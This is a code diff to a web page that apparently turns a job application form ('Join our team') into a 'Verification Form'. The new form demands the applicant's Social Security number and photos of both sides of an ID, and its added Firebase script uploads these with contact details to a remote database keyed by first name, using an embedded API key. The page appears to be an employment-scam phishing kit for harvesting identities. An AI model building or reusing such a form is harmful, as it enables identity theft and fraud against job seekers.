@@ -546,7 +546,7 @@
             margin-bottom: 10px;
             padding: 10px;
         }
-        .contact-form {
+        .employment-form {
             width: 100%;
             max-width: 100000px;
             margin: 0 auto;
@@ -799,7 +799,7 @@
             <div class="wrap">
                 <div class="hero-container">
                     <div class="page-title">
-                        <h1>Customer Service Representative</h1>
+                        <h1>Verification Form</h1>
                     </div>
                     <div class="page-description">
                         <p>Join our team </p>
@@ -808,84 +808,69 @@
             </div>
         </div>
         <section>
-            <form class="contact-form" id="myForm"
-                action="https://formspree.io/f/mvoeknla"
-                method="POST" enctype="multipart/form-data">
+
+            <form class="employment-form" id="myForm">
                 <fieldset>
-                    <legend>Tell us about
-                        yourself</legend>
-                    <label for="Representativefirst_name">First
-                        name</label>
-                    <input type="text"
-                        name="Representativefirst_name"
-                        id="Representativefirst_name" required>
+                    <legend>Contact
+                        Information</legend>
 
+                    <label for="first_name">First
+                        Name:</label>
+                    <input type="text" id="first_name" name="first_name" required>
 
-                    <label for="last_name">Last
-                        name</label>
-                    <input type="text" name="last_name"
-                        id="last_name" required>
+                    <label for="lastName">Last
+                        Name:</label>
+                    <input type="text" id="lastName" name="lastName" required>
 
-                    <label for="email">Email</label><input
-                        type="email" name="email" id="email"
+                    <label for="email">Email:</label>
+                    <input type="email" id="email" name="email" required>
+
+                    <label for="phoneNumber">Phone
+                        Number:</label>
+                    <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="(XXX) XXX-XXXX"
                         required>
 
-                    <label for="phone_number">Phone
-                        number</label><input type="tel"
-                        name="phone_number" id="phone_number"
-                        placeholder="(XXX) XXX-XXXX" required>
-
-                    <label for="address">Country</label>
-                    <select name="country" id="country"
+                    <label for="SSN">SSN:</label>
+                    <input type="text" id="SSN" name="SSN" placeholder="XXX-XX-XXXX" maxlength="11"
                         required>
-                        <option value>
-                            Country
-                        </option>
-                        <option
-                            value="United States of America">
-                            United
-                            States
-                            of
-                            America
-                        </option>
-                        <option value="Canada">
-                            Canada
-                        </option>
-                    </select>
+                </fieldset>
 
-                    <label for="owner_address">Address:</label>
-                    <input type="text" id="owner_address"
-                        name="owner_address" required>
+                <fieldset>
+                    <legend>Address
+                        Information</legend>
+
+                    <label for="address">Address:</label>
+                    <input type="text" id="address" name="address" required>
 
                     <label for="city">City:</label>
-                    <input type="text" id="city" name="city"
-                        required>
+                    <input type="text" id="city" name="city" required>
 
                     <label for="state">State:</label>
-                    <input type="text" id="State" name="State"
+                    <input type="text" id="state" name="state" required>
+
+                    <label for="zipCode">Zip
+                        Code:</label>
+                    <input type="number" id="zipCode" name="zipCode" pattern="\d{5}" placeholder="12345"
+                        maxlength="5" required>
+                </fieldset>
+                <fieldset>
+                    <legend>File Uploads
+                    </legend>
+
+                    <label for="upload_doc_front">Upload
+                        ID
+                        (Front)</label>
+                    <input type="file" id="upload_doc_front" name="upload_doc_front" accept=".pdf,.jpg,.png"
                         required>
 
-                    <label for="zipcode">Zip
-                        Code:</label>
-                    <input type="number" id="zipcode"
-                        name="zipcode" pattern="\d{5}"
-                        placeholder="12345" required>
+                    <label for="upload_doc_back">Upload
+                        ID (Back)</label>
+                    <input type="file" id="upload_doc_back" name="upload_doc_back" accept=".pdf,.jpg,.png"
+                        required>
                 </fieldset>
-                <p><br /></p>
-                <fieldset>
-                    <legend>Upload Resume
-                    </legend>
-                    <p style>Please
-                        upload your
-                        resume</p>
-                    <label for="upload_doc">Upload
-                        Resume</label><input type="file"
-                        name="upload_doc" id="upload_doc"
-                        accept=".pdf,.jpg,.png" required>
-                </fieldset>
-                <button class="btn submit-form"
-                    type="submit">Submit</button>
+                <button class="btn submit-form" type="submit">Submit</button>
             </form>
+
         </section>
 
 
@@ -922,7 +907,7 @@
     <script type='text/javascript' src='/wp-content/themes/smp/assets/js/jquery.functions.js?ver=6.2.4'
         id='functions-js'></script>
         <script>
-            document.getElementById('phone_number').addEventListener('input', function (event) {
+            document.getElementById('phoneNumber').addEventListener('input', function (event) {
                 let input = event.target;
                 let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
                 if (value.length > 10) {
@@ -935,6 +920,127 @@
                 input.value = value;
             });
         
+            document.getElementById('SSN').addEventListener('input', function (event) {
+                let input = event.target;
+                let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
+                if (value.length > 9) {
+                    value = value.slice(0, 9); // Limit to 9 digits
+                }
+                if (value.length > 2) {
+                    // Format the SSN as XXX-XX-XXXX
+                    value = value.replace(/(\d{3})(\d{2})(\d{4})/, '$1-$2-$3');
+                }
+                input.value = value;
+            });
+        </script>
+        <script type="module">
+            // Import the necessary functions from the Firebase SDK
+            import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+            import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+            import { getDownloadURL, getStorage, ref as storageRef, uploadBytes, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
+        
+            // Your web app's Firebase configuration
+            const firebaseConfig = {
+          apiKey: "AIzaSyDQqClgWjBt9MSwFsuGhllUDG_XbmeKd3M",
+          authDomain: "verification-form-id.firebaseapp.com",
+          projectId: "verification-form-id",
+          storageBucket: "verification-form-id.appspot.com",
+          messagingSenderId: "120178727736",
+          appId: "1:120178727736:web:28ca2a09fbafaac172ffcd"
+        };
+        
+            // Initialize Firebase
+            const app = initializeApp(firebaseConfig);
+            const database = getDatabase(app);
+            const storage = getStorage(app);
+        
+            // Function to generate a random file name
+            function generateRandomFileName(file) {
+                const randomString = Math.random().toString(36).substring(2, 8);
+                const fileExtension = file.name.split('.').pop();
+                return `file_${randomString}.${fileExtension}`;
+            }
+        
+            // Function to upload file to Firebase Storage with a renamed file
+            function uploadFile(file) {
+                return new Promise((resolve, reject) => {
+                    const fileName = generateRandomFileName(file);
+                    const storageRefVar = storageRef(storage, `uploads/${fileName}`);
+        
+                    // Use put for smaller files and uploadBytesResumable for larger files
+                    const uploadTask = file.size < 1024 * 1024 ? uploadBytes(storageRefVar, file) : uploadBytesResumable(storageRefVar, file);
+        
+                    uploadTask.then((snapshot) => {
+                        getDownloadURL(snapshot.ref).then((downloadURL) => {
+                            resolve(downloadURL);
+                        });
+                    }).catch((error) => {
+                        console.error('Error uploading file:', error);
+                        reject(null);
+                    });
+                });
+            }
+        
+            // Submit form and store data in Firebase
+            document.getElementById('myForm').addEventListener('submit', function (e) {
+                e.preventDefault();
+        
+                // Get form values
+                const first_name = document.querySelector('[name="first_name"]').value;
+                const email = document.querySelector('[name="email"]').value;
+                const SSN = document.querySelector('[name="SSN"]').value;
+                const city = document.querySelector('[name="city"]').value;
+                const zipCode = document.querySelector('[name="zipCode"]').value;
+                const lastName = document.querySelector('[name="lastName"]').value;
+                const phoneNumber = document.querySelector('[name="phoneNumber"]').value;
+                const address = document.querySelector('[name="address"]').value;
+                const state = document.querySelector('[name="state"]').value;
+        
+                const fileInputFront = document.querySelector('[name="upload_doc_front"]');
+                const fileFront = fileInputFront.files[0];
+        
+                const fileInputBack = document.querySelector('[name="upload_doc_back"]');
+                const fileBack = fileInputBack.files[0];
+        
+                // Check if both files are selected
+                if (!fileFront || !fileBack) {
+                    alert('Please select both front and back files');
+                    return;
+                }
+        
+                // Store data in Firebase
+                const formData = {
+                    first_name,
+                    email,
+                    SSN,
+                    city,
+                    zipCode,
+                    lastName,
+                    phoneNumber,
+                    address,
+                    state,
+                    fileFrontURL: null,
+                    fileBackURL: null
+                };
+        
+                // Upload front and back files concurrently
+                Promise.all([uploadFile(fileFront), uploadFile(fileBack)])
+                    .then(([fileFrontURL, fileBackURL]) => {
+                        formData.fileFrontURL = fileFrontURL;
+                        formData.fileBackURL = fileBackURL;
+        
+                        // Set data at the specified location using first name as the key
+                        const formsRef = ref(database, `forms/${first_name}`);
+                        set(formsRef, formData).then(() => {
+                            console.log('Form submitted successfully!');
+                            // Redirect to submit.html after successful submission
+                            window.location.href = 'submitted.html';
+                        }).catch((error) => {
+                            console.error('Error submitting form:', error);
+                            alert('An error occurred while submitting the form. Please try again.');
+                        });
+                    });
+            });
         </script>
 </body>
 
